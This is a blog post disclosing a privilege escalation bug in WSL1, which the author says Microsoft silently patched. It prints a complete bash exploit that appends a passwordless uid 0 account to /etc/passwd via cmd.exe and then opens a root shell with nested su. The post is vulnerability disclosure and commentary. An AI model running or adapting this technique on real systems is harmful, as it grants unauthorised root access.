<!doctype html>
<html>
	<head>
		<title>Root Escalation Vulnerability in WSL1 - Boring Dev</title>
		<link rel="stylesheet" href="/boring.css" />
		<meta charset="utf-8" />
	<meta name="generator" content="Hexo 5.3.0"></head>
	<body>
		<a href="/" id="logo">
			<img src="/boring.svg" width="43" height="304" />
		</a>
		<div class="content">
			<div class="post">
				<h1>Root Escalation Vulnerability in WSL1</h1>
				<div class="article-date">by Alto Alexander, posted January 17th 2021, 5:30:13 am</div>
				<blockquote>
<p><strong>NOTE: This vulnerability seems to have been silently patched by Microsoft since reaching out to them.</strong>
Whether or not my reaching out to them was what triggered the fix, I can’t say for sure.</p>
</blockquote>
<p>About a year ago I accidentally came across some strange filesystem properties
in WSL1 that I was ultimately able to exploit to gain root permissions in the
Ubuntu system I was running under WSL1. However, I imagine this could have been used
in any Linux installation under the WSL1 subsystem.</p>
<p>Speaking of Microsoft, I reached out to three different members of the WSL team regarding
any sort of bounty program for a WSL1 vulnerability regarding root escalation by means of the
filesystem bridge, or if that was something they’d be interested in. None of said contacts
wanted much to do with me. I was met with short responses, and ultimately ghosted entirely.</p>
<p>Microsoft has since patched this, so I guess if you can do it yourself, fuck the security
community right?</p>
<p>So I figured I’d write about it here.</p>
<p>Before I begin, let me give you my unsolicited opinion: both WSL1 and 2 are terrible
excuses for software and you should not be using them if you need a secure Linux installation.
Just use bare-metal Linux, or a proper VM (WSL2 is not a proper VM<sup><a target="_blank" rel="noopener" href="https://news.ycombinator.com/item?id=25612962">[1]</a></sup><sup><a target="_blank" rel="noopener" href="https://news.ycombinator.com/item?id=24641441">[2]</a></sup>).
We need to stop giving big corporations a free pass to spit out whatever nonsense they want while their employees
yell at independent open-sourcers for not moving fast enough, all the while profiting off
their work with little to no compensation.</p>
<p>With that, let’s begin.</p>
<hr>
<p>The exploit is rather simple - so simple, in fact, that it was found <em>by accident</em> while writing some
build scripts that utilized a Windows executable to generate a file in the Linux filesystem.</p>
<p>When a file is created from Windows in the Linux subsystem’s filesystem via the network mount,
the file has User-level security and permissions on Windows, but <code>root:root</code> ownership and
<code>a+wrx</code> permissions on Linux.</p>
<p>Why Microsoft decided this was a sane default concerns me.</p>
<p>All we have to do is tack on an entry in <code>passwd</code> with <code>uid=0,gid=0</code> using the Windows console
and we’re able to <code>su</code>; however, in my findings, I couldn’t execute just anything under <code>su</code> as
the dummy root account, but the one thing I could run under <code>su</code> was <code>su</code> itself, and since
I was <code>uid=0</code> then I could simply run <code>su root</code> again and drop a shell as the <em>real</em> <code>root</code> account.</p>
<p>Putting it all together, let’s set up our elevation script with some boilerplate that makes sure
we’re not masking any errors.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env bash</span></span><br><span class="line">set -euo pipefail</span><br></pre></td></tr></table></figure>
<p>Then, let’s make sure we’re actually running under WSL (because it makes no sense to attempt this
in any other environment).</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function is_wsl() &#123;</span><br><span class="line">	command -v wslpath &amp;&gt;/dev/null</span><br><span class="line">&#125;</span><br><span class="line">if ! is_wsl; then</span><br><span class="line">	echo &#x27;error: not wsl&#x27; &gt;&amp;2</span><br><span class="line">	exit 1</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p>Next, we’ll create a temporary file that we can <code>type.exe</code> out from the Windows side. This file
will contain our dummy root account entry that will be appended to <code>passwd</code>. Note the UID and GID
fields being <code>0</code>.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf &#x27;%s\n&#x27; &quot;lul::0:0::/:/bin/bash&quot; &gt; /tmp/passwd.lul</span><br></pre></td></tr></table></figure>
<p>Now, we make use of WSL1’s automatic <code>.exe</code> handling and execute <code>cmd.exe</code> to append our entry
to <code>/etc/passwd</code>. Since Window’s doesn’t understand Linux paths inherently, we pass them through the
<code>wslpath</code> utility first.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /C type &quot;$(wslpath -w /)tmp\\passwd.lul&quot; \&gt;\&gt; &quot;$(wslpath -w /)etc\\passwd&quot;</span><br></pre></td></tr></table></figure>
<p>A little cleanup.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/passwd.lul</span><br></pre></td></tr></table></figure>
<p>Finally, we drop a root shell using the nested <code>su</code>:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su - lul /bin/sh -c /bin/su root</span><br></pre></td></tr></table></figure>
<hr>
<p>Creating a file using this method no longer creates the files as root, but as the running user within
the linux subsystem, which effectively patched everything up. That being said, I can almost guarantee
you this was abused in some fashion, maliciously or not.</p>
<p>I’m a little annoyed that Microsoft didn’t take my attempt to report seriously, but still found it important enough
<em>internally</em> to investigate and fix it. Now with all of the shit coming out about WSL2 being utter garbage,
it’s safe to say that WSL is, overall, a very failed experiment - which says something about NT, which was
designed exactly for this purpose.</p>
<p>I suppose I’m happy it’s patched, but still leaves a really shit taste in my mouth.</p>
<p>- Alto</p>

			</div>
		</div>
	</body>
</html>
